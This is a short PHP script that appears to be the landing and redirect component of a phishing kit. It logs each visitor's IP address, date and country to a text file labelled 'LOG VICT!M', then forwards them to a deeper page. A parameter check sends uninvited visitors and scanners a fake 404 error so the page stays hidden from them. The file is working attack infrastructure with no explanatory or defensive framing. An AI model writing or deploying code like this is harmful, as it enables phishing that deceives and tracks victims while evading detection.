<?php

include ('.LYL-G/INFO.php');
include ('./LYL-G/bt.php');
include ('./LYL-G/setlang.php');
$url_p="$_SERVER[REQUEST_URI]";
$url_p2=strstr($url_p, '?');
$milaf = fopen("VST.txt","a");

if($shows == "yes") {
if(isset($_GET["cs"])&&$_GET["cs"]=="wh") {  
fwrite($milaf,$ib."  -| LOG VICT!M !! |-   ".$dt."                  -        " . $cntc ."\n");   
header("Location: newdir.php$url_p2");
}else{header('HTTP/1.0 404 Not Found');exit();}    
}else{fwrite($milaf,$ib."  -| LOG VICT!M !! |-   ".$dt."                  -        " . $cntc ."\n");   
header("Location: newdir.php$url_p2");}
     
?>

